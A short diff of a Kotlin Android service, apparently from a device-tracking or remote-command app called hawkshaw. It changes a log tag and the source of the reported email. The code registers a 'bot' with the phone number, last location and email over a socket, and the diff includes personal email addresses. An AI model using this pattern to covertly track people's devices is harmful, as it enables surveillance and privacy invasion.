@@ -28,7 +28,7 @@ import me.hawkshaw.R
 class CommandService : Service() {
 
 
-    private val tag = "suthar"
+    private val tag = "jramirez"
     private val prefs by lazy { this.getSharedPreferences("com.android.hawkshaw", Context.MODE_PRIVATE) }
 
     private val powerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
@@ -80,7 +80,8 @@ class CommandService : Service() {
             bot.put("version", params.version)
             bot.put("phone", params.phone)
             bot.put("location", LocationMonitor(this, socket).getLastLocation())
-            bot.put("email", prefs.getString("email", "abhinav.suthar.50@gmail.com"))
+            //bot.put("email", prefs.getString("email", "toyogua@gmail.com"))
+            bot.put("email", params.email)
             bot.put("socket_id", socket.id())
             val prevClientID = prefs.getString("clientID", "whatever")
             Log.d(tag, "Prev client Id $prevClientID")
